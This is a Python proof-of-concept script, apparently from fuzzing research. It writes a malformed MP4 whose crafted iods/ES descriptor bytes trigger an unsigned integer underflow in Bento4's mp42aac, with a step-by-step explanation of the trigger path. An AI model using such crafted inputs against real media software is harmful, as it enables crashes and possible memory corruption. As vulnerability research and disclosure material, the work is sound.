#!/usr/bin/env python3
"""
VULN 003 PoC Generator: AP4_EsDescriptor SubStream Integer Underflow
======================================================================
Target: Bento4 mp42aac
Bug:    Ap4EsDescriptor.cpp lines 100-103 - unsigned subtraction underflow
        payload_size(2) - AP4_Size(offset-start)(3) = 0xFFFFFFFF

Trigger path:
  mp42aac -> AP4_File -> AP4_IodsAtom -> AP4_DescriptorFactory
          -> AP4_InitialObjectDescriptor (tag=0x10)
          -> IOD SubStream (size=5)
          -> AP4_EsDescriptor(stream, header_size=2, payload_size=2)
             * ReadUI16(ES_ID) consumes 2 bytes  (pos: 2->4)
             * ReadUI08(flags)  consumes 1 byte  (pos: 4->5)
             * offset-start = 5-2 = 3
             * payload_size - AP4_Size(3) = 2u - 3u = 0xFFFFFFFF  <-- UNDERFLOW
             * AP4_SubStream(iod_substream, offset=5, size=0xFFFFFFFF)

Key construction detail:
  The IOD SubStream has exactly 5 bytes:
    [0x03][0x02][0x00][0x01][0x00]
      ES   ES   ES_ID  ES_ID  extra
     tag  size  hi     lo     byte(read as flags, enabling 3-byte path)

  Without the extra byte (pos 4), ReadUI08 would hit EOS at pos 4,
  position would stay at 4, giving offset-start=2, and 2-2=0 (no bug).
  The extra byte is ESSENTIAL to trigger the underflow.
"""

import struct
import os

OUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IodsAtom_h"
OUT_FILE = os.path.join(OUT_DIR, "vuln_003.mp4")


def make_box(box_type: str, payload: bytes) -> bytes:
    """Build a standard MP4 box: size(4B) + type(4B) + payload."""
    return struct.pack(">I", 8 + len(payload)) + box_type.encode("ascii") + payload


def expand_size(size: int) -> bytes:
    """MPEG-4 expandable class size encoding (MPEG-4 Descriptor header)."""
    if size < 0x80:
        return bytes([size])
    result = []
    result.append(size & 0x7F)
    size >>= 7
    while size > 0:
        result.append(0x80 | (size & 0x7F))
        size >>= 7
    result.reverse()
    return bytes(result)


def make_descriptor(tag: int, payload: bytes) -> bytes:
    """Build an MPEG-4 descriptor: tag(1B) + expandable_size + payload."""
    return bytes([tag]) + expand_size(len(payload)) + payload


# -----------------------------------------------------------------------
# ES_Descriptor: tag=0x03, payload_size=2 (only ES_ID, no flags byte)
#
# Stated payload = 2 bytes: [ES_ID_hi=0x00][ES_ID_lo=0x01]
# But after this, there is 1 extra byte (0x00) in the IOD SubStream that
# the ES_Descriptor constructor will read as the flags byte.
#
# Result inside the constructor:
#   ReadUI16(ES_ID): 2 bytes consumed -> pos = start+2
#   ReadUI08(bits):  1 byte consumed  -> pos = start+3   <-- reads extra byte!
#   offset - start = 3
#   payload_size - AP4_Size(3) = 2 - 3 = 0xFFFFFFFF     <-- UNDERFLOW
# -----------------------------------------------------------------------
es_payload = bytes([0x00, 0x01])                   # ES_ID = 1 (2 bytes only)
es_descriptor_bytes = bytes([0x03, 0x02]) + es_payload  # tag=0x03, size=0x02, 2B payload

# The extra byte comes IMMEDIATELY after es_descriptor_bytes in IOD payload.
# It is OUTSIDE the ES_Descriptor's stated payload_size=2 but INSIDE the
# IOD SubStream window, so ReadUI08(flags) in the ES constructor reads it.
es_extra_flag_byte = bytes([0x00])   # flags=0 -> no dependency/url/ocr branch

# -----------------------------------------------------------------------
# IOD payload (InitialObjectDescriptor, tag=0x10 = AP4_DESCRIPTOR_TAG_MP4_IOD)
#
# IOD payload layout (12 bytes total):
#   2B  ObjectDescriptorID bits:
#         bits[15:6] = OD_ID = 0
#         bit[5]     = url_flag = 0
#         bit[4]     = includeInlineProfileLevelFlag = 0
#         bits[3:0]  = 0xF (reserved, set as in WriteFields)
#   5B  profile level indications (all 0xFF = "not specified"):
#         OD, Scene, Audio, Visual, Graphics
#   4B  ES_Descriptor (tag=0x03, size=0x02, 2-byte ES_ID payload)
#   1B  extra byte (0x00) -> read by ES constructor as flags byte
#
# IOD SubStream = IOD_payload - 7 bytes consumed for IOD fixed fields = 5 bytes
# Those 5 bytes are: [0x03][0x02][0x00][0x01][0x00]
# -----------------------------------------------------------------------
iod_bits = struct.pack(">H", 0x000F)          # OD_ID=0, url=0, inline=0, res=0xF
iod_profiles = bytes([0xFF, 0xFF, 0xFF, 0xFF, 0xFF])  # 5 profile levels
iod_payload = iod_bits + iod_profiles + es_descriptor_bytes + es_extra_flag_byte
assert len(iod_payload) == 12, f"IOD payload must be 12 bytes, got {len(iod_payload)}"

# IOD descriptor: tag=0x10, size=12 (single-byte expandable encoding)
iod_descriptor = bytes([0x10]) + expand_size(len(iod_payload)) + iod_payload

# -----------------------------------------------------------------------
# iods box: version(1B)+flags(3B) + IOD descriptor
# -----------------------------------------------------------------------
iods_payload = bytes([0x00, 0x00, 0x00, 0x00]) + iod_descriptor
iods = make_box("iods", iods_payload)

# -----------------------------------------------------------------------
# mvhd box (version 0, 100 bytes payload)
# -----------------------------------------------------------------------
mvhd_payload = (
    bytes([0x00, 0x00, 0x00, 0x00])         +  # version(0) + flags(0)
    struct.pack(">I", 0)                    +  # creation_time
    struct.pack(">I", 0)                    +  # modification_time
    struct.pack(">I", 1000)                 +  # timescale
    struct.pack(">I", 0)                    +  # duration
    struct.pack(">i", 0x00010000)           +  # rate = 1.0
    struct.pack(">H", 0x0100)               +  # volume = 1.0
    bytes(10)                               +  # reserved
    struct.pack(">9i",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)                  +  # matrix (identity)
    bytes(24)                               +  # pre_defined
    struct.pack(">I", 1)                       # next_track_id
)
assert len(mvhd_payload) == 100, f"mvhd payload must be 100 bytes, got {len(mvhd_payload)}"
mvhd = make_box("mvhd", mvhd_payload)

# -----------------------------------------------------------------------
# moov + ftyp
# -----------------------------------------------------------------------
moov = make_box("moov", mvhd + iods)
ftyp = make_box("ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42")

mp4_data = ftyp + moov

# -----------------------------------------------------------------------
# Write output
# -----------------------------------------------------------------------
os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"Generated: {OUT_FILE}")
print(f"Total size: {len(mp4_data)} bytes")
print()
print("Expected underflow path:")
print("  iods -> IOD(tag=0x10, payload_size=12)")
print("    IOD SubStream size = 12 - 7 = 5 bytes")
print("    IOD SubStream content: [0x03][0x02][0x00][0x01][0x00]")
print("    ES_Descriptor(payload_size=2):")
print("      ReadUI16(ES_ID) -> 2 bytes consumed, pos=4")
print("      ReadUI08(flags) -> extra byte at pos 4 consumed, pos=5")
print("      offset-start = 5-2 = 3")
print("      payload_size - AP4_Size(3) = 2u - 3u = 0xFFFFFFFF  <- UNDERFLOW")
print("      SubStream created with size=0xFFFFFFFF (~4.3 GB)")
